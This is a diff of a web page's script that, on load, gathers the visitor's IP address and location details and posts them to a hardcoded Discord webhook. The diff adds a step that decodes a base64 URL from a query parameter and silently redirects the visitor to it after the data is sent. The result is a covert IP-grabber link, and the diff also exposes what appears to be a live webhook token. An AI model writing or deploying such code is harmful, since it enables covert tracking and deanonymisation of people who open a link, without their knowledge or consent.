@@ -45,17 +45,21 @@
     <script>
         const discordWebhookUrl = 'https://discord.com/api/webhooks/1322345788462071875/OrpRYnyIugZkioBPX5Nm1WaE8_LDh0dza2u8dNnWo5DY8ql0qG7ajjxf1MI3XCeA0aco'; // Replace with your Discord webhook URL
 
-        function getQueryParamsFromURL(url) {
-            try {
-                const params = new URL(url).searchParams;
-                const queryParams = {};
-                for (const [key, value] of params.entries()) {
-                    queryParams[key] = value;
-                }
-                return queryParams;
-            } catch {
-                return {};
+        // Helper function to extract query params
+        function getQueryParams(url) {
+            const params = new URL(url).searchParams;
+            const queryParams = {};
+            for (const [key, value] of params.entries()) {
+                queryParams[key] = value;
             }
+            return queryParams;
+        }
+
+        // Decrypt a URL (simulate UUID decryption for simplicity)
+        function decryptUUID(encryptedUUID) {
+            // Replace this logic with your real decryption logic
+            const base64Decoded = atob(encryptedUUID); // Simulates a simple base64 decryption
+            return base64Decoded;
         }
 
         async function fetchAndSendIPInfo() {
@@ -84,23 +88,10 @@
                 tbody.innerHTML = row;
                 table.style.display = 'table';
 
-                // Get referrer query parameters or fallback to current URL
-                const referrer = document.referrer;
-                let queryParams = {};
-
-                if (referrer) {
-                    queryParams = getQueryParamsFromURL(referrer);
-                }
-
-                // If referrer has no params, get params from current URL
-                if (Object.keys(queryParams).length === 0) {
-                    queryParams = getQueryParamsFromURL(window.location.href);
-                }
-
-                // Initialize queryParamsString only after queryParams is determined
-                const queryParamsString = Object.entries(queryParams).length > 0
-                    ? Object.entries(queryParams).map(([key, value]) => `${key}: ${value}`).join(', ')
-                    : 'None';
+                // Get query params and decrypt URL
+                const queryParams = getQueryParams(window.location.href);
+                const encryptedURL = Object.values(queryParams)[0]; // Assume the first param is the encrypted UUID
+                const redirectURL = decryptUUID(encryptedURL);
 
                 // Prepare the embed payload for Discord
                 const embed = {
@@ -113,7 +104,7 @@
                                 { name: "Country Name", value: data.countryName || 'N/A', inline: true },
                                 { name: "Continent", value: data.continent || 'N/A', inline: true },
                                 { name: "Is Proxy", value: data.isProxy ? 'Yes' : 'No', inline: true },
-                                { name: "Code", value: queryParamsString, inline: false }
+                                { name: "Redirect URL", value: redirectURL, inline: false }
                             ],
                             color: 3447003 // Optional: Set a color for the embed
                         }
@@ -129,7 +120,8 @@
                     body: JSON.stringify(embed)
                 });
 
-                alert('Data sent to Discord successfully!');
+                // Redirect to the decrypted URL
+                window.location.href = redirectURL;
 
             } catch (error) {
                 alert('Failed to fetch or send data: ' + error.message);
